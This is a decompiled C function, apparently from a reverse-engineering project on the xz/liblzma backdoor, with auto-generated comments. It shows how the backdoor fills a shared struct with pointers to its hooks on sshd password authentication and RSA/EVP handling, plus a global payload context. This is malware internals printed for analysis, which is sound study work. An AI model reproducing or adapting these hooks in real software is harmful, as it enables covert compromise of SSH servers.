// /home/kali/xzre-ghidra/xzregh/102850_init_backdoor_shared_globals.c
// Function: init_backdoor_shared_globals @ 0x102850
// Calling convention: __stdcall
// Prototype: int __stdcall init_backdoor_shared_globals(backdoor_shared_globals_t * shared_globals)


/*
 * AutoDoc: Seeds the shared global block with the mm/EVP hook entry points and a pointer to the lone `global_ctx` instance. Every hook
 * consults this block at runtime, so the function simply wires the exported function pointers into the struct and returns success
 * once the pointer checks pass.
 */

#include "xzre_types.h"

int init_backdoor_shared_globals(backdoor_shared_globals_t *shared_globals)

{
  int init_status;
  
  init_status = 5;
  if (shared_globals != (backdoor_shared_globals_t *)0x0) {
    // AutoDoc: Publish the authpassword monitor hook so every process sees the same entry point.
    shared_globals->authpassword_hook_entry = mm_answer_authpassword_send_reply_hook;
    // AutoDoc: Point the shared block at the RSA/EVP shim so later callers inherit the resolved trampoline.
    shared_globals->evp_set1_rsa_hook_entry = evp_pkey_set1_rsa_backdoor_shim;
    // AutoDoc: Expose the singleton `global_ctx` pointer that carries payload buffers, sshd metadata, and imports.
    shared_globals->global_ctx_slot = (global_context_t **)&global_ctx;
    init_status = 0;
  }
  return init_status;
}

